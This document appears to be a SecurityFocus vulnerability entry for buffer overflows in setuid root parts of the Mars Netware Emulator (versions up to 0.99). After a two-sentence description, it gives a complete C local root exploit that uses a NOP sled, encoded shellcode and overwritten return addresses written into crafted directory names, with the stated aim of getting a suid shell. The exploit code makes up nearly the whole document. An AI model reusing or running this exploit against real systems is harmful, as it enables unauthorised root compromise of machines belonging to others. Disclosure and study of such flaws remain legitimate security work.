source: http://www.securityfocus.com/bid/617/info


There are several buffer overflows in the setuid root components of the Mars Netware Emulator package. They allow for a local root compromise through the overflowing of buffers without bounds checking. It is to be assumed that all versions prior to and including 0.99 are vulnerable to these attacks. 

// get a suid shell :)

#include <stdio.h>
#include <errno.h>
#include <sys/stat.h>
#include <strings.h>
#include <unistd.h>

#define BUFSIZE		254
#define NOP		0x90
#define RET		0xbffff3a0
#define ALIGN		1

int makedir(dir)
char *dir;
{

	if (mkdir(dir, (S_IRWXU | S_IRWXG | S_IRWXO)))
		return -1;

	if (chdir(dir))
		return -1;

	return 0;
}
	

int main(void)
{
	int i = 0, noplen = 0;
	char pid[10], buf[BUFSIZE], *ptr = NULL;

	char szelkod[] =

		"\xeb\x03\x5e\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc6\x0d"
		"\x31\xc9\xb1\x88\x80\x36\x01\x46\xe2\xfa\xea\x19\x2e"
		"\x63\x68\x6f\x2e\x62\x69\x6c\x6e\x65\x01\x35\x36\x34"
		"\x34\x01\x2e\x63\x68\x6f\x2e\x72\x69\x01\x88\xf7\x54"
		"\x88\xe4\x82\xed\x19\x56\x57\x52\xe9\x01\x01\x01\x01"
		"\x5a\x80\xc2\xcf\x11\x01\x01\x8c\xba\x0b\xee\xfe\xfe"
		"\x88\x7c\xf1\x8c\x82\x14\xee\xfe\xfe\x88\x44\xf5\x8c"
		"\x92\x1b\xee\xfe\xfe\x88\x54\xf9\xc6\x44\xfd\x01\x01"
		"\x01\x01\xb9\x47\x01\x01\x01\x30\xf7\x30\xc8\x52\x88"
		"\xf2\xcc\x81\x8c\x44\xf1\x88\xc0\xb9\x0a\x01\x01\x01"
		"\x88\xff\x30\xd3\x52\x88\xf2\xcc\x81\x8c\x64\xdd\x5a"
		"\x5f\x5e\xc8\xc2\x91\x91\x91\x91\x91\x91\x91\x91\x91"
		"\x91\x91\x91\x00";

	sprintf(pid, "%d", getpid());

	if (mkdir(pid, (S_IRWXU | S_IRWXG | S_IRWXO)))
	{
		perror("mkdir()");
		return -1;
	}

	if (chdir(pid))
	{
		perror("chdir()");
		return -1;
	}

	ptr = buf;
	noplen = BUFSIZE - strlen(szelkod);

	for (i=0;i<noplen;i++)
		*ptr++ = NOP;

	*ptr += noplen;

	for (i=0;i<strlen(szelkod);i++)
		*ptr++ = szelkod[i];

	*ptr = '\0';

	if(makedir(buf) < 0)
	{
		perror("makedir()");
		return -1;
	}

	bzero(buf, BUFSIZE);
	memset(buf, NOP, 40 + ALIGN);

	if(makedir(buf) < 0)
	{
		perror("makedir()");
		return -1;
	}

	bzero(buf, BUFSIZE);

	for(i=0;i<96;i+=4)
		*(long *)&buf[i] = RET;

	for(i=0;i<2;i++)
	{

		if(makedir(buf) < 0)
		{
			perror("makedir()");
			return -1;
		}
	}

	return 0;
}